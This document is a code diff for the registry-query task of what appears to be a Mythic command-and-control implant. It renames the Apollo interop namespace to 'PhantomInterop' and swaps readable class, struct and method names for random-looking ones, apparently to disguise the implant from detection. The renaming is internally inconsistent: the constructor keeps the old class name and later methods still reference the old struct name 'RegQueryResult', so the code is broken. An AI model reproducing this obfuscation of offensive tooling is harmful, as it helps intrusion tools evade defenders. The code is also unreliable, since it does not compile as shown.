@@ -6,10 +6,10 @@
 
 #if REG_QUERY
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Utils;
 using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
@@ -17,10 +17,10 @@ using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class reg_query : Tasking
+    public class TacticalExecutor06BC : Tasking
     {
         [DataContract]
-        internal struct RegQueryParameters
+        internal struct OptimizedValidatorD2BE
         {
             [DataMember(Name = "hive")]
             public string Hive;
@@ -28,7 +28,7 @@ namespace Tasks
             public string Key;
         }
         [DataContract]
-        internal struct RegQueryResult
+        internal struct CipherEngine358C
         {
             [DataMember(Name = "hive")]
             public string Hive;
@@ -43,7 +43,7 @@ namespace Tasks
             [DataMember(Name = "result_type")]
             public string ResultType;
         }
-        public reg_query(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public reg_query(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
@@ -56,7 +56,7 @@ namespace Tasks
             }
         }
 
-        private static object GetValue(string hive, string subkey, string key)
+        private static object RobustResolver6555(string hive, string subkey, string key)
         {
             using (RegistryKey regKey = RegistryUtils.GetRegistryKey(hive, subkey, false))
             {
@@ -72,11 +72,11 @@ namespace Tasks
             }
         }
 
-        private void SetValueType(object tmpVal, ref RegQueryResult res)
+        private void IntelligentProviderBB19(object tmpVal, ref RegQueryResult res)
         {
             if (tmpVal is String)
             {
-                res.Value = string.IsNullOrEmpty(tmpVal.ToString()) ? "(value not set)" : tmpVal.ToString();
+                res.Value = ValidationHelper.IsStringEmpty(tmpVal.ToString()) ? "(value not set)" : tmpVal.ToString();
                 res.Type = "string";
             }
             else if (tmpVal is int)
